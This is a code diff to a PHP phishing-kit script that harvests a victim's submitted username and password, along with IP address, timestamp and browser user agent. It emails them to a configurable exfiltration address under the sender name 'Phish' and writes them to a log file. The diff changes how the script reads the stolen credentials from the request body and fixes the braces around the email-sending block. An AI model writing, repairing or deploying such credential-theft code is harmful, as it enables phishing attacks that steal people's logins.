@@ -5,8 +5,8 @@ $exfilemail = ""; // -> enter an email address to send the details via email
 $logpath = "log"; // -> make this variable empty to disable logging feature
 
 // login info
-$email = $_REQUEST['login'];
-$password = $_REQUEST['password'];
+$data = file_get_contents('php://input');
+parse_str($data, $parsed);
 
 // IP address of the victim
 $ip = getenv("REMOTE_ADDR");
@@ -17,15 +17,15 @@ $browser = $_SERVER['HTTP_USER_AGENT'];
 
 // log details
 $message .= "=============+=============\n";
-$message .= "Username/Email:	$email\n";
-$message .= "Password:	$password\n";
+$message .= "Username/Email:	".$parsed['login']."\n";
+$message .= "Password:	".$parsed["password"]."\n";
 $message .= "IP: 		".$ip."\n";
 $message .= "Date:		".$timestamp."\n";
 $message .= "User Agent:	".$browser."\n";
 $message .= "===========================\n\n\n";
 
 // email headers
-if ($exfilemail != "")
+if ($exfilemail != "") {
     $from = 'Phish <noreply>';
     $headers  = 'MIME-Version: 1.0' . "\r\n";
     $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
@@ -38,7 +38,7 @@ if ($exfilemail != "")
 
     //send email
     mail($exfilemail,$subject,$message,$headers);
-
+}
 
 // save logs
 if ($logpath != "")
